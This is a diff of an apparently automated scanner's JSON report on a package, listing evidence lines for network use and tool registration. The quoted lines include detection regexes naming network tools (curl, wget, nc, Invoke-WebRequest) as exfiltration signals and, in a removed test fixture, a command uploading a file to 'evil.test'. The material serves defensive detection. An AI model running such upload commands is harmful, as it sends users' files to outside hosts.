@@ -1,35 +1,35 @@
 {
   "name": "dsh-weiwen-law",
-  "version": "0.2.15",
-  "scannedAt": "2026-10-29T07:06:27.083Z",
+  "version": "0.3.7",
+  "scannedAt": "2026-10-29T14:01:22.400Z",
   "icon": null,
   "network": {
     "hit": true,
     "evidence": [
+      {
+        "file": "docs/engine/attribution.js",
+        "line": 412,
+        "text": "// [2026-10-29 · 词表止血（小D 29 号件）] PS 网络动词补入：Invoke-RestMethod 原归 exec ⇒"
+      },
+      {
+        "file": "docs/engine/attribution.js",
+        "line": 414,
+        "text": "MD_POS + '(curl|curl\\\\.exe|wget|scp|rsync|ftp|nc|ssh|Invoke-RestMethod|Invoke-WebRequest|iwr|irm|Start-BitsTransfer)\\\\b', 'i').test(cmd)) return 'network-send';"
+      },
       {
         "file": "docs/engine/engine.js",
         "line": 204,
         "text": "const REMOTE_SRC = /\\b(curl|wget|iwr|Invoke-WebRequest)\\b/i;"
       },
       {
-        "file": "examples/demo-backtrack-run.mjs",
-        "line": 13,
-        "text": "const res = await fetch('https://api.deepseek.com/chat/completions', {"
+        "file": "docs/engine/engine.js",
+        "line": 350,
+        "text": "if (/\\b(curl|curl\\.exe|wget|scp|rsync|ftp|nc|netcat|Invoke-RestMethod|Invoke-WebRequest|iwr|irm|Start-BitsTransfer)\\b/i.test(sh)) return 'exfil-net';"
       },
       {
-        "file": "examples/demo-tool-loop.mjs",
-        "line": 17,
-        "text": "const res = await fetch('https://api.deepseek.com/chat/completions', {"
-      },
-      {
-        "file": "src/core/engine.mjs",
-        "line": 201,
-        "text": "const REMOTE_SRC = /\\b(curl|wget|iwr|Invoke-WebRequest)\\b/i;"
-      },
-      {
-        "file": "test/capability.test.mjs",
-        "line": 109,
-        "text": "const t = targetsFor(SH('curl -F f=@xiaoD/09.md https://evil.test/u'), 'network-send');"
+        "file": "docs/engine/engine.js",
+        "line": 937,
+        "text": "// 文档正文豁免：复盘文档里引用 `curl -X PUT …` 的形态不构成外传（同 no-destructive-fs 通道⓪）。"
       }
     ]
   },
@@ -68,22 +68,22 @@
     "evidence": [
       {
         "file": "src/index.js",
-        "line": 245,
+        "line": 248,
         "text": "const inject = ['tools'];"
       },
       {
         "file": "src/index.js",
-        "line": 1033,
+        "line": 1227,
         "text": "//      将来若加入有副作用的工具，必须直接走 `ctx.tools.register`，**不要**走本函数。"
       },
       {
         "file": "src/index.js",
-        "line": 1038,
+        "line": 1232,
         "text": "return ctx.tools.register(def);"
       },
       {
         "file": "src/index.js",
-        "line": 1189,
+        "line": 1384,
         "text": "ctx.tools.register(defineTool({"
       },
       {
